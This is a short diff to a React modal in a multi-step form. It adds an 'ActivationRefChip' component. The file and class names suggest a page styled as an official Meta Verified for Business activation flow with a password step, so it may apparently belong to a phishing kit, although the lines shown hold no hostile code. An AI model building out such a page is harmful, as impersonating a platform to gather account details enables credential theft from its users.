@@ -5,6 +5,7 @@ import CustomCheckbox from '#components/check-box/CustomCheckbox';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
+import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
 
 interface InfomationsModalProps {
   isOpend: boolean;
@@ -108,6 +109,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       backdropClassName="mv-official-backdrop"
     >
       <div className="flex min-h-full min-w-0 w-full flex-col">
+        <ActivationRefChip />
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
             <div className='mv-activation-hint mb-[14px] rounded-[12px] border px-[12px] py-[10px]'>
